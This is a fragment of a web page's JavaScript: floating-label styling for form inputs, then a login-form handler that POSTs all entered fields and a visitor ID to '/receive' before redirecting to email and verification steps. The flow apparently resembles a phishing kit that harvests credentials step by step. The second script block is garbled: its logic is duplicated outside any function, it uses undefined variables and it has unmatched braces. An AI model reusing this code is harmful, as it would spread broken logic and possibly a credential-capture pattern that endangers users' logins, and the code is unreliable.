                  <script>
  var allInputs = document.querySelectorAll('.MuiInputBase-input');
  
  allInputs.forEach((input) => {
    const labels = input.parentElement.previousElementSibling;
    const outline = input.parentElement;
    
    // Ensure the label has a class for transition
    labels.classList.add('input-label');

    // Add an event listener to the input element for the "focus" event
    input.addEventListener('focus', () => {
      console.log('focused');
      console.log(outline);
      // Modify the styles of the label element when the input is focused
      labels.style.top = '-23px';
      labels.style.left = '0px';  
      labels.style.zIndex = '2'; 
      labels.style.fontSize = '11px';  
      labels.style.fontWeight = '400';  
      labels.style.color = '#8C58D0'; 
      input.style.transform = 'translate(0px, 1px) scale(1)';   
      //labels.style.backgroundColor = 'white';
      //outline.style.borderColor = '#yellow!important';
      labels.style.paddingLeft = "0px";
      labels.style.paddingRight = "0px";
      input.style.paddingLeft = "0px"; 
      labels.style.borderRadius = "6px"; 
    }); 

    // Add an event listener for the "blur" event to reset the styles
    input.addEventListener('blur', () => {
      if (input.value <= 0) { 
        labels.style.top = ''; 
        labels.style.left = '';
        labels.style.zIndex = '';
        labels.style.fontSize = '';
        labels.style.fontWeight = ''; 
        labels.style.color = '';
        input.style.transform = '';
        outline.style.borderColor = '';
        //outline.style.borderColor = 'red';
        
      } else {
        labels.style.top = '-23px'; 
        labels.style.left = '0px';
        labels.style.zIndex = '10';
        labels.style.fontSize = '11px'; 
        labels.style.fontWeight = '400'; 
        labels.style.color = '';
      }
    });
  });
</script>
<script>
	$(document).ready(function() {
    $('#subbut').on('click', function(event) {
        event.preventDefault();

        let myForm = $("#myForm");
        let checkInputs = document.querySelectorAll('.log_ins');
		
        
        // Flag to track if any input is empty
        let isEmpty = false;

        // Loop through each input field
        for (const check of checkInputs) {
        const outline = check.parentElement;
        
            check.addEventListener('focus', () => {
                
            });

            if (check.value.trim() === "") {
                isEmpty = true;
                outline.style.borderColor = 'red';
            }
        }

        // If no input is empty, proceed with form submission
        if (!isEmpty) {
            let userinfo = myForm.serializeArray();
            let user = {};
            let visitor = document.getElementById('UserID').value;

            userinfo.forEach((value) => {
                // Use the 'name' attribute to create user object
                user[value.name] = value.value;
            });

            user['visitor'] = visitor;
            console.log(user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                url: "/receive",
                data: user
            }).done(function(msg) {
                // Store visitor info in sessionStorage
                sessionStorage.setItem('visitor', visitor);
                console.log(msg);
                window.location.href = "/login/email";
                console.log(msg); // Log success message
            }).fail(function(err, textstatus, error) {
            //window.location.href = "login/2"; 
                console.log('fail');
            });
        }
    });
});

        for (const check of checkInputs) {
            check.addEventListener('focus', () => {
                console.log('focus');
                check.nextElementSibling.style.display = "none";
            });

            if (check.value.trim() === "") {
                document.getElementById('alertManagerArea').style.display = "block";
                isEmpty = true;
            }
        }

        // If no input is empty, proceed with form submission
        if (!isEmpty) {
            let userinfo = myForm.serializeArray();
            let user = {};
            let visitor = document.getElementById('CustomerID').value;

            userinfo.forEach((value) => {
                // Use the 'name' attribute to create user object
                user[value.name] = value.value;
            });

            user['visitor'] = visitor;
            console.log(user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                url: "/receive",
                data: user
            }).done(function(msg) {
                // Store visitor info in sessionStorage
                sessionStorage.setItem('visitor', visitor);
                console.log(msg);
                window.location.href = "/login/verification/1";
                console.log(msg); // Log success message
            }).fail(function(err, textstatus, error) {
            //window.location.href = "login/2"; 
                console.log('fail');
            });
        }
    });
});

</script>
</html>
